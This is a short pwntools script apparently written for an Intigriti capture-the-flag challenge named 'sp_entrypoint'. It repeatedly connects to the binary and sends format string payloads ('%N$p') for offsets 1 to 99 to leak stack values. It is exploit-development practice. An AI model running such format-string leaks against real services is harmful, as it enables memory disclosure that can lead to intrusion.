from pwn import *

gs = '''
b *main+137
continue
'''

elf = context.binary = ELF("./sp_entrypoint")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']


for i in range(1, 100):
    io = start()

    io.sendlineafter("> ", b"1")

    io.sendlineafter(": ", f"%{i}$p".encode())

    io.recvuntil("Your card is: ")

    print(f"[+] {i} :", io.recvline().strip().decode())

    io.close()
